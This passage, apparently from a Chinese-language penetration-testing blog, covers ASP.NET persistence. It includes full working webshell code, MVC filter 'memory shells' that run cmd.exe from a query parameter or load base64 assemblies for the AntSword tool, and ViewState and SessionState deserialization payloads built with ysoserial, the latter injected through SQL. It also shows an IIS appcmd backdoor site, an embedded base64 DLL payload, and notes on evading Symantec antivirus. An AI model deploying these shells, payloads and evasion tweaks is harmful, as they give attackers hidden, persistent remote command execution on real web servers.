                        System.Web.HttpContext.Current.Response.Write("<pre>" + Encoding.Default.GetString(data) + "</pre>");  
                    }  
                    else  
                    {  
                        System.Web.HttpContext.Current.Response.Write("虚拟WebShell功能一切正常，尝试执行cmd命令吧！example: godshell.aspx?cmd=ipconfig");  
                    }  
                }  
      
                return stream;  
            }  
        }  
      
    </script>  
    

但其实不用实现virtualFile，直接把payload写在virtualPrivoder中即可，现实中面临免杀的问题其实不是插入位置的问题而是process启动进程的问题，更改位置和更改filter内存马一样意义不大

### viewstate

#### 使用条件

  1. 需要拿到硬编码的 machineKey，一般储存在根目录下的 web.config 文件中。
  2. 较常见与使用了多点负载均衡部署的传统 ASP.net MVC 开发的网站之中，因为machineKey默认为动态生成，在负载均衡环境中，需要固定使用相同的machineKey才能互相识别其他节点生成的页面里的VIEWSTATE数据。
  3. 通用系统里的 machineKey 一般不会更改。

#### 原理

.NET 使用 LosFormatter 序列化数据存储到客户端的ViewState，当提交POST
请求后又会将ViewState保存的数据发送到服务端，这个时候在服务端就会使用 ObjectStateFormatter
进行反序列化，所以我们用ysoserial的LosFormatter生成ViewState数据

#### 测试环境

添加login.aspx

    
    
    <%@ Page Language="C#" AutoEventWireup="true" CodeBehind="login.aspx.cs"  
    Inherits="UploadFile.login" %>  
    <!DOCTYPE html>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>  
    <title></title>  
    </head>  
    <body>  
    <form id="form1" runat="server">  
    <div>  
    <p>  
    <asp:TextBox runat="server" ID="userName" placeholder="请输入用户  
    名"></asp:TextBox>  
    </p>  
    <p>  
    <asp:TextBox runat="server" ID="pwd" placeholder="请输入密码">  
    </asp:TextBox>  
    </p>  
    <p>  
    <asp:Button runat="server" OnClick="Unnamed_Click" Text="登录" />  
    </p>  
    </div>  
    </form>  
    </body>  
    </html>  
    

设置login.aspx.cs

    
    
    using System;  
    using System.Collections.Generic;  
    using System.Linq;  
    using System.Web;  
    using System.Web.UI;  
    using System.Web.UI.WebControls;  
    namespace UploadFile  
    {  
    public partial class login : System.Web.UI.Page  
    {  
    protected void Page_Load(object sender, EventArgs e)  
    {  
    }  
    protected void Unnamed_Click(object sender, EventArgs e)  
    {  
    string username = this.userName.Text;  
    string pwd = this.pwd.Text;  
    if(string.IsNullOrEmpty(username) || string.IsNullOrEmpty(pwd))  
    {  
    Response.Write("not null");  
    return;  
    }  
    if(username=="admin" && pwd == "123456")  
    {  
    Response.Write("success");  
    }  
    else  
    {  
    Response.Write("falied");  
    }  
    }  
    }  
    }  
      
    

设置web.config

    
    
    <?xml version="1.0" encoding="utf-8"?>  
    <!--  
    有关如何配置 ASP.NET 应用程序的详细信息，请访问  
    https://go.microsoft.com/fwlink/?LinkId=169433  
    -->  
    <configuration>  
    <system.web>  
    <compilation debug="true" targetFramework="4.7.2" />  
    <httpRuntime targetFramework="4.7.2" />  
    <pages>  
    <namespaces>  
    <add namespace="System.Web.Optimization" />  
    </namespaces>  
    <controls>  
    <add assembly="Microsoft.AspNet.Web.Optimization.WebForms"  
    namespace="Microsoft.AspNet.Web.Optimization.WebForms" tagPrefix="webopt" />  
    </controls>  
    </pages>  
    <machineKey  
    validationKey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D"  
    decryptionKey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2"  
    decryption="AES" validation="HMACSHA256" />  
    </system.web>  
      
    ........  
    </configuration>  
    

payload

    
    
    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" --path="/login.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" --validationalg="HMACSHA256" --validationkey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D"  
    
    
    
    dG%2BXIvGDQVlqrEpKA48OYX9G9sc0WlzQ65MPU3Hm%2FZtYIlHWF19dCQOffbqs5hNvs3FTBKfmIRdNlTh9LseDhdZ6nUIAJTqXUPf9G9XLyIwPrBc4lzCEPJvbtkqal8rYTnuEXvBQtqhkh6Urg0OqDHbkcZfj%2F6bN8cgdQe%2BxZZnrls6P5adeanrNmAcmLTplGGG0gW6Ll5VIedCtyMt3mkHauGTj95F%2B6HSp%2BpqJ806kpaxi5f5FRVXfbO3Ylv7PR%2FpfNRnrMpnuX3SV1NDjbvWyzSn63TFTGXgjIvVk68tCo8QPXWR00iqDugGFuqd6jKHLN8r7tzvebfYxziIESFmPx6dmwe5qZrytqapErGRmMqNHPPCvMaWozwtqhEAqTDLabfaZMAkt0cPIkl57wDEjT0DDQaIRPDDyyqwh1NuLo0vPUBWwjV7VUqyBauATGlnKvcNN4HgSdL2qvZsRGybsIuWrgWbq9LaOEO9B8ZZABhL%2BKCa5qNS4gjZNWqnvnbI6iOqCflWS%2BDg5Fcb0ThI3iS2pSbddIZUDe%2FxE6n93KPyJ27enD%2BTB8QbaPDj2u8YtuWoxDbacxhraHyL29Ep8bCjty189m7hccGJVrfYqsy%2BqqpWyCLGhmgIWMzIsDDl0mgh9FwGA6nBOIOYyH0sAb8TXpfjvjC58GLKfPupWdTG%2FO7iDtGWLFkmCGcRMCeF2JCsttQlsYnIJq4TVaLHtvjGwNZDLKCvApeyO%2FIWpU2BrPe%2FaMNbEaemw7PLm%2BBgF40QFPqXdQaP4e%2B79jAMAjKvJmE9WhfiISROw1DvRuF17hN8X%2Ft6C9gyQRY97g8UMNLKdW77hgdRp%2FEzD5jbG5HY%2Bx1mivd2lEI8COOGPTYm69zHWLO4i3gh3KmCuNNc85XhAxiZpZ8Ytq0QB%2FsVeSt8KS70cpRBbbQmv%2Bffxu%2FLSQaQluGFoXRD55wFNJphST7K5eLlhRclfffcviLYkwiRARx9EAPR4HoBylNfzWJPCBqfEZc%2FrnANizSXwnLfCfMmXa8lT7%2FzFMb3IlSTOvZaqfi%2FA8iiXWCx0HeJwlWvL0VkGld70B%2FrrGbJasD067fMfSKeUQeeGkohnAWdcqYS%2BzYDCOuoMdL%2Bzs4W9SUr0INgqH%2FsxUK4KsXqH%2Fp%2FxVNzXCx65IsfJ%2BqTkU8kJc%2BDPgs8LnRAq6Q1pMhY8qSaNlJ%2FC6hEwRBNY8mlVO%2B8cBkN7uWoqFvsGZPPxSJZ0flXo%2FDdjJMcS%2FKzgAwcRu92AojRQOKBzYFNDRGpia7uSnH3zIhez4BBT2Jou3g%3D%3D  
    

本地测试是因为burp抓包问题，ip应设置为内网非127.0.0.1的ip，如果用virtual stdio调试，需修改host头未localhost

![]()

### sessionstate

#### 前置条件

  * sqlserver sa权限
  * 服务器负载均衡，.net站点session存放在数据库中

服务器调用时反序列化取出session

    
    
                    using(stream = new MemoryStream(buf)) {  
                        item = SessionStateUtility.DeserializeStoreData(context, stream, s_configCompressionEnabled);  
                        _rqOrigStreamLen = (int) stream.Position;  
                    }  
    

将反序列化的数据交给HttpStaticObjectsCollection.Deserialize(reader)处理最终交给AltSerialization.ReadValueFromStream(reader)处理，调用ysoserial中AltSerialization反序列化链生成payload

    
    
    ysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -o base64 -c "calc.exe"  
    

添加SessionStateUtility 包装

    
    
    先將原本從 ysoserial.net 產出的 payload 從 base64 轉成 hex 表示，再前後各別添加 6、1 bytes  
      
      timeout    false  true            HttpStaticObjectsCollection             eof  
    ┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐  
    00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff  
    

注入数据库中

    
    
    ?id=1; UPDATE ASPState.dbo.ASPStateTempSessions  
           SET SessionItemShort = 0x{Hex_Encoded_Payload}  
           WHERE SessionId LIKE '{ASP.NET_SessionId}%25'; --  
    

注入后用同样的session id访问任意aspx页面即可出发反序列化操作

## 非Framework

#### iis后门（appcmd）

通过iis的appcmd命令添加一个网站，在另一个网站放我的shell（类似listener内存马）。

  1. appcmd要求高权限
  2. 要求能执行命令
  3. 其他的端口可以被访问到

    
    
    C:\windows\sytstem32\inetsrv\APPCMD add site /name:test /bindings:"http/*:81:" /physicalPath:"C:\windows\temp\123"  
    cacls.exe C:\windows\temp\123 /e /t /g everyone:F  
    C:\windows\sytstem32\inetsrv\APPCMD set app "test/" /applicationPool:".NET v2.0"  
    

## 预编译问题

  * 预编译的站点不会执行我们上传的aspx文件
    
        C:\Windows\Microsoft.NET\Framework64\v2.0.50727\aspnet_compiler -v \ -p src target -fixednames  
    生成的文件除了PrecompiledApp.config全部拖入目标网站  
    

    * 预编译配置文件在PrecompiledApp.config，修改updatable为true就能动态编译aspx文件，需要重启iis
    * 直接上传编译好的aspx文件,在aspx文件夹下执行如下命令

## Shell管理工具及免杀

symantec测试软件

https://bbs.kafan.cn/forum.php?mod=forumdisplay&fid=51&page=1&filter=typeid&typeid=292

先安装服务端再安装客户端，免费试用60天，测完免杀下次重新装虚拟机就好了

aspxspy就是利用最简单的启动一个process执行命令，静态直接被杀

![]()

哥斯拉普通马直接杀

filter内存马静态均可存活,修改哥斯拉内存马为aspx文件，尝试重写Equals方法失败，跟踪报错

    
    
    An IL variable is not available at the current native IP  
    

根据官方回答开启JIT失败，未解决

蚁剑本身的内存马功能根据介绍是使用虚拟目录内存马，且需要落地一个蚁剑shell再用蚁剑后渗透插件派生，很麻烦，这里直接用蚁剑的payload+filter内存马成功连接

改用蚁剑成功，直接使用命令可看到iis打开了程序，尝试使用蚁剑打开程序同样可看到iis打开了程序

![]()

![]()

### 直接使用cmd

    
    
    <%@ Page Language="c#"%>  
    <%@ Import Namespace="System.Diagnostics" %>  
    <%@ Import Namespace="System.Web.Mvc" %>  
    <script runat="server">  
        public void Page_load()  
        {  
        }  
        public class MyAuthorizeFilter : AuthorizeAttribute  
        {  
            public override void OnAuthorization(AuthorizationContext filterContext)  
            {  
                String cmd = filterContext.HttpContext.Request.QueryString["cmd"];  
                if (cmd != null)  
                {  
                    HttpResponseBase response = filterContext.HttpContext.Response;  
                    Process p = new Process();  
                    p.StartInfo.FileName = "cmd.exe";  
                    p.StartInfo.Arguments = "/c " + cmd;  
                    p.StartInfo.UseShellExecute = false;  
                    p.StartInfo.RedirectStandardOutput = true;  
                    p.StartInfo.RedirectStandardError = true;  
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;  
                    p.Start();  
                    byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());  
                    response.Write(Encoding.Default.GetString(data));  
                }  
                Console.WriteLine("auth filter inject");  
            }  
      
        }  
      
    </script>  
    <%  
        GlobalFilterCollection filters = GlobalFilters.Filters;  
        filters.Add(new MyAuthorizeFilter());  
    %>  
    

### 蚁剑

    
    
    <%@ Page Language="c#"%>  
    <%@ Import Namespace="System.Web.Mvc" %>  
    <%@ Import Namespace="System.Web.Mvc.Filters" %>  
    <script runat="server">  
        public class MyAuthFilter : IAuthenticationFilter  
        {  
            public void OnAuthentication(AuthenticationContext filterContext)  
            {  
                HttpContext context = HttpContext.Current;  
                String Payload = filterContext.HttpContext.Request.Params["ant"];  
                if (Payload != null)  
                {  
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));  
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);  
                    context.Response.End();  
                }  
                Console.WriteLine("auth filter inject");  
            }  
      
            public void OnAuthenticationChallenge(AuthenticationChallengeContext filterContext)  
            {  
            }  
        }  
    </script>  
    <%  
        GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;  
        globalFilterCollection.Add(new MyAuthFilter(), -2);  
    %>  
    

可自定义修改class名称方便隐藏，缺点，返回结果未加密

![]()

添加编码解码器

    
    
    <%@ Page Language="c#"%>  
    <%@ Import Namespace="System.IO" %>  
    <%@ Import Namespace="System.Security.Cryptography" %>  
    <%@ Import Namespace="System.Web.Mvc" %>  
    <%@ Import Namespace="System.Web.Mvc.Filters" %>  
    <script runat="server">  
        public class MyAuthFilter : IAuthenticationFilter  
        {  
            public void OnAuthentication(AuthenticationContext filterContext)  
            {  
                HttpContext context = HttpContext.Current;  
                String Payload = filterContext.HttpContext.Request.Params["ant"];  
                if (Payload != null)  
                {  
                    /*string key = "3c6e0b8a9c15224a";  
                    byte[] strr = Convert.FromBase64String(Payload);  
                    var aes = new RijndaelManaged();  
                    aes.IV = Encoding.UTF8.GetBytes(key);  
                    aes.Key = Encoding.UTF8.GetBytes(key);  
                    aes.Mode = CipherMode.CBC;  
                    aes.Padding = PaddingMode.Zeros;  
                    var cryptoTransform = aes.CreateDecryptor();  
                    var resultArray = cryptoTransform.TransformFinalBlock(strr, 0, strr.Length);  
                    string tt = System.Text.Encoding.UTF8.GetString(resultArray);  
                    byte[] bytes = Convert.FromBase64String(tt);  
                    string zz=  Encoding.UTF8.GetString(bytes);*/  
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));  
                     
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);  
                    //context.Response.Write();  
                    //MemoryStream sm_response = new MemoryStream();  
                    /*string sm_response = context.Response.ToString();  
                    byte[] arraysm_response = Encoding.UTF8.GetBytes(sm_response);  
                    var aes_response = new RijndaelManaged();  
                    aes_response.IV = Encoding.UTF8.GetBytes(key);  
                    aes_response.Key = Encoding.UTF8.GetBytes(key);  
                    aes_response.Mode = CipherMode.CBC;  
                    aes_response.Padding = PaddingMode.Zeros;  
                    var cTransform = aes_response.CreateEncryptor();  
                    var resultArray_response = cTransform.TransformFinalBlock(arraysm_response, 0, arraysm_response.Length);  
                    string str_aes_response_b64 = Convert.ToBase64String(resultArray_response);  
                    context.Response.Write(str_aes_response_b64);*/  
                    context.Response.End();  
                }  
                Console.WriteLine("auth filter inject");  
            }  
      
            public void OnAuthenticationChallenge(AuthenticationChallengeContext filterContext)  
            {  
                var a = 1;  
            }  
        }  
    </script>  
    <%  
        GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;  
        globalFilterCollection.Add(new MyAuthFilter(), -2);  
    %>  
    

添加后发现可以处理cmd及测试连接即仅有ant参数的功能，而蚁剑管理文件还需要添加path参数，导致报错

![]()

去翻一下payload源码，看下data[_]的赋值到底是怎么做的,将dll还原

    
    
    using System;  
    using System.IO;  
    using System.Collections.Generic;  
    using System.Linq;  
    using System.Text;  
    using System.Threading.Tasks;  
      
    namespace test1  
    {  
        class Program  
        {  
            static void Main(string[] args)  
            {  
                string Asstring = "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b25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0Zvcm0AZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABFeGNlcHRpb24AZ2V0X01lc3NhZ2UAV3JpdGUAVHlwZQBHZXRUeXBlAGdldF9Jc0FycmF5AEh0dHBDb250ZXh0AGdldF9SZXNwb25zZQBnZXRfUmVxdWVzdABnZXRfQ3VycmVudABwYXRoAFN5c3RlbS5JTwBEaXJlY3RvcnlJbmZvAEdldERpcmVjdG9yaWVzAEZpbGVTeXN0ZW1JbmZvAGdldF9OYW1lAEZpbGUARGF0ZVRpbWUAR2V0TGFzdFdyaXRlVGltZQBUb1N0cmluZwBGb3JtYXQARmlsZUluZm8AR2V0RmlsZXMAZ2V0X0xlbmd0aABJbnQ2NABoZXgAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTdWJzdHJpbmcASW50MzIAU3lzdGVtLkdsb2JhbGl6YXRpb24ATnVtYmVyU3R5bGVzAFBhcnNlAENvbnZlcnQAVG9DaGFyAEFwcGVuZABzcmMAb3BfRXF1YWxpdHkARW5jb2RpbmcAR2V0RW5jb2RpbmcARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAR2V0Qnl0ZXMAVG9CYXNlNjRTdHJpbmcAAAtVAFQARgAtADgAAQ1iAGEAcwBlADYANAAAAQADMgAABy0APgB8AAEHfAA8AC0AAQlwAGEAdABoAAATRQBSAFIATwBSADoALwAvACAAABt7ADAAfQAvAAkAewAxAH0ACQAwAAkALQAKAAEneQB5AHkAeQAtAE0ATQAtAGQAZAAgAGgAaAA6AG0AbQA6AHMAcwABHXsAMAB9AAkAewAxAH0ACQB7ADIAfQAJAC0ACgABB2gAZQB4AAAAAACq+d0F1oRrR7bCYt6MxNdGAAi3elxWGTTgiQiwP19/EdUKOgMGEgkDBhINAgYOBCABAhwEIAEBHAQgAQ4OAyAAAQQgAQEIBCABAQ4EIAASGQUAAg4ODgMgAA4GAAMODg4OCAcFDg4ODhIhBCAAEiUDIAACAh0cBCAAEg0EIAASCQQAABIpCAcDHRwSKRIpBSAAHRItBQABETkOBgADDg4cHAUgAB0SPQMgAAoHAAQODhwcHBUHCg4SLRItEj0dEi0IETkd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";  
                byte[] Asbyte = Convert.FromBase64String(Asstring);  
                StreamWriter sw = new StreamWriter(@"dir.dll");  
                sw.BaseStream.Write(Asbyte, 0, Asbyte.Length);  
                sw.Close();  
            }  
        }  
    }  
    

使用dnspy逆向看下代码,找到多了一层base64的原因

![]()

然而最后致命错误居然是byte[]转string结尾会有\00字符，所以字节长度不正确，base64报错，需在结尾去除

可以对比下删除和不删除情况下string的length就可以看到

    
    
    var res = utf8.GetString(plainBytes).TrimEnd('\0').TrimEnd(null);  
    

同时开始着手修改返回包加密，找到蚁剑aspxcsharp项目的payload（https://github.com/AntSwordProject/AntSword-
Csharp-Template）

可以在源码中看到输出在asoutput方法中，直接修改try中的功能代码

![]()

![]()

同时在开头加入模块引用

![]()

使用项目的build脚本编译，将编译成功的dist文件夹中的文件替换掉antSword-master\antSword-
master\source\core\aspxcsharp\template中的文件，重启蚁剑

修改成功如下

![]()

